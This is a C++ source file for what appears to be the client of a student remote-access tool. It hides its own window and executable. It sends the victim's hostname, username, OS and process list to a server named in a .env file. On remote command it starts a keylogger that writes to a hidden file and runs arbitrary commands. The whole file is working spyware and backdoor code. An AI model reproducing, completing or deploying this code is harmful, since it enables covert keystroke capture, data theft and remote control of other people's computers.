#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_PacketType.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "../utils/SystemInfo/SystemInfo.hpp"
#include "../utils/SystemInfo/TaskList.hpp"
#include "../utils/NetworkInfo/NetworkInfoFactory.hpp"
#include "../utils/SystemInfo/KeyLogger.hpp"
#include "../utils/CommandSystem/BashExec.hpp"
#include <iostream>
#include <windows.h>
#include <thread>
#include <atomic>
#include <iomanip> 
#include <sstream>

// Global variables for thread communication
std::atomic<bool> running(true);
LPTF_Socket* globalSocket = nullptr;
static KeyLogger* globalLogger = nullptr;
static std::thread keylogThread;


// Thread function to handle server requests
void serverRequestHandler() {
    while (running) {
        try {
            std::vector<uint8_t> data = globalSocket->recvBinary();
            LPTF_Packet packet = LPTF_Packet::deserialize(data);
            
            switch (packet.getType()) {
                case PacketType::GET_INFO: {
                    std::cout << "\n[SERVEUR] Demande des informations système..." << std::endl;
                    
                    // Collect system information
                    auto sysInfo = SystemInfo::getSystemInfo();
                    std::string jsonInfo = SystemInfo::toJson(sysInfo);
                    
                    std::cout << "[SERVEUR] Informations collectées et envoyées." << std::endl;
                    
                    // Send response
                    std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
                    LPTF_Packet response(1, PacketType::RESPONSE, 0, 1, 1, payload);
                    
                    globalSocket->sendBinary(response.serialize());
                    std::cout << "Entrez le message : ";
                    std::cout.flush();
                    break;
                }
                
                case PacketType::RESPONSE: {
                    std::string response(packet.getPayload().begin(), packet.getPayload().end());
                    std::cout << "\nRéponse serveur : " << response << std::endl;
                    std::cout << "Entrez le message : ";
                    std::cout.flush();
                    break;
                }
                
                case PacketType::KEYLOG: {
                    // Start or stop keylogger based on payload
                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                    if (cmd == "start") {
                        if (!globalLogger) {
                            globalLogger = new KeyLogger("key_file.txt");
                            KeyLogger::hideFile("key_file.txt");
                            keylogThread = std::thread([]() {
                                globalLogger->start();
                            });
                            keylogThread.detach();
                            }
                        }
                        else if (cmd == "stop") {
                            if (globalLogger) {
                                globalLogger->stop();
                                KeyLogger::unhideFile("key_file.txt");
                                delete globalLogger;
                                globalLogger = nullptr;
                            }
                        }

                    break;
                }



                case PacketType::EXEC_COMMAND: {
                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                    BashExec exec;
                    BashExec::executeToFile(cmd, "exec_output.txt");
                    break;
                }

                
                default:
                    std::cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << std::endl;
                    std::cout << "Entrez le message : ";
                    std::cout.flush();
            }
            
        } catch (const std::exception& e) {
            if (running) {
                std::cout << "\n[ERREUR] Connexion fermée: " << e.what() << std::endl;
                running = false;
            }
            break;
        }
    }
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    // test des fonction getipaddresses getmacaddresses de collecte d'informations réseau
    //! to delete later
     auto network = NetworkInfoFactory::create();

    std::cout << "IP Addresses:\n";
    for (const auto& ip : network->getIPAddresses()) {
        std::cout << "  " << ip << "\n";
    }
    std::cout << "MAC Addresses:\n";
    for (const auto& mac : network->getMACAddresses()) {
        std::cout << "  " << mac << "\n";
    }

    // Active IP and MAC addresses
    std::cout << "Active IP Addresses:\n";
    for (const auto& ip : network->getActiveIPAddresses()) {
        std::cout << "  " << ip << "\n";
    }
    std::cout << "Active MAC Addresses:\n";
    for (const auto& mac : network->getActiveMACAddresses()) {
        std::cout << "  " << mac << "\n";
    }
    // fin de test des fonction de collecte d'informations réseau
    // Hide the current executable
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    KeyLogger::hideFile("key_file.txt");

    try {
        LPTF_Socket::initialize();
        LPTF_Socket clientSocket;
        globalSocket = &clientSocket;
        
        auto env = EnvLoader::loadEnv("../../.env");
        std::string ip = EnvLoader::loadIP("../../.env");
        int port = EnvLoader::loadPort("../../.env");

        clientSocket.connectSocket(ip, port);
        std::cout << "Connecté au serveur " << ip << ":" << port << std::endl;

        // AUTO-SEND SYSTEM INFO ON CONNECTION
        std::cout << "Envoi automatique des informations système..." << std::endl;
        auto sysInfo = SystemInfo::getSystemInfo();
        std::string jsonInfo = SystemInfo::toJson(sysInfo);

        std::cout << "Informations système:" << std::endl;
        std::cout << "- Nom d'hôte: " << sysInfo["hostname"] << std::endl;
        std::cout << "- Utilisateur: " << sysInfo["username"] << std::endl;
        std::cout << "- Système: " << sysInfo["operating_system"] << std::endl;

        // Send system info as GET_INFO packet (since that's what server expects)
        std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
        LPTF_Packet sysInfoPacket(1, PacketType::GET_INFO, 0, 1, 1, payload);
        clientSocket.sendBinary(sysInfoPacket.serialize());

        std::cout << "Informations système envoyées au serveur." << std::endl;

        // KEYLOGGER 
        // std::thread([]() {
        //     KeyLogger logger("key_file.txt");
        //     logger.start();
        // }).detach();
        // ========================
        ProcessLister processLister;
        // cout << "\nListe des processus en cours d'exécution :" << endl;
        // if (!processLister.listProcesses()) {
        //     cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
        // }

        std::vector<std::string> exeList = processLister.getExeList();

        // cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
        // const int columns = 3;
        // int count = 0;
        // for (const auto& exe : exeList) {
        //     cout << std::left << std::setw(25) << exe; 
        //     count++;
        //     if (count % columns == 0)
        //         cout << endl;
        // }
        // if (count % columns != 0)
        //     cout << endl;

        std::cout << "(Tapez 'sortie' pour quitter)" << std::endl;

        // Send process list to server
        std::ostringstream oss;
        for (const auto& exe : exeList) {
            oss << exe << '\n';
        }
        std::string procData = oss.str();
        std::vector<uint8_t> procPayload(procData.begin(), procData.end());
        LPTF_Packet procPacket(1, PacketType::PROCESS_LIST, 0, 1, 1, procPayload);
        clientSocket.sendBinary(procPacket.serialize());

        std::thread serverThread(serverRequestHandler);

        // Main thread for user interaction
        while (running) {
            std::string msg;
            std::cout << "Entrez le message : ";
            getline(std::cin, msg);

            if (msg == "sortie") {
                running = false;
                break;
            }

            // Send regular messages
            std::vector<uint8_t> msgPayload(msg.begin(), msg.end());
            LPTF_Packet packet(1, PacketType::GET_INFO, 0, 1, 1, msgPayload);
            clientSocket.sendBinary(packet.serialize());
        }

        // Clean shutdown
        running = false;
        if (serverThread.joinable()) {
            serverThread.join();
        }
        clientSocket.closeSocket();

    } catch (const std::exception& e) {
        std::cerr << "Exception Client: " << e.what() << std::endl;
        running = false;
        return 1;
    }
    return 0;
}
